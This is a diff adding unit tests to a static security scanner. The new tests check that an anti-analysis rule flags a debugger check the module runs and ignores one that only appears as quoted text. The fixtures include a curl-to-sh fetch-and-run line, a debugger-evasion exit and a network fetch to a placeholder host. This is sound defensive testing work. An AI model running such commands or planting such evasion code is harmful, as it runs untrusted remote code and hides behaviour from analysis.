@@ -42,3 +42,29 @@ class TestProse:
             tmp_path, "docs/build.sh", "#!/bin/sh\ncurl -fsSL https://example.com/i.sh | sh\n"
         )
         assert found and all(severity >= Severity.MEDIUM for severity in found)
+
+
+class TestAProbeWrittenAsText:
+    """`SUSPECT.ANTI_ANALYSIS.001` counts a debugger check the module runs, not one it only quotes."""
+
+    FETCH = "import urllib.request\nurllib.request.urlopen('https://x.invalid/t')\n"
+
+    @staticmethod
+    def anti_analysis(tmp_path, text: str) -> list[Severity]:
+        path = tmp_path / "pkg" / "bench.py"
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        return [f.severity for f in result.findings if f.rule_id == "SUSPECT.ANTI_ANALYSIS.001"]
+
+    def test_a_check_inside_a_code_template_is_text(self, tmp_path) -> None:
+        template = 'SCRIPT = """\nimport sys\nprint({"trace": sys.gettrace() is not None})\n"""\n'
+        assert self.anti_analysis(tmp_path, template + self.FETCH) == []
+
+    def test_a_check_the_module_runs_still_counts(self, tmp_path) -> None:
+        source = "import sys\nif sys.gettrace() is not None:\n    sys.exit(0)\n" + self.FETCH
+        assert self.anti_analysis(tmp_path, source)
+
+    def test_quoted_text_beside_a_real_check_keeps_it(self, tmp_path) -> None:
+        source = 'import sys\nlabel = "sys.gettrace("; traced = sys.gettrace()\n' + self.FETCH
+        assert self.anti_analysis(tmp_path, source)
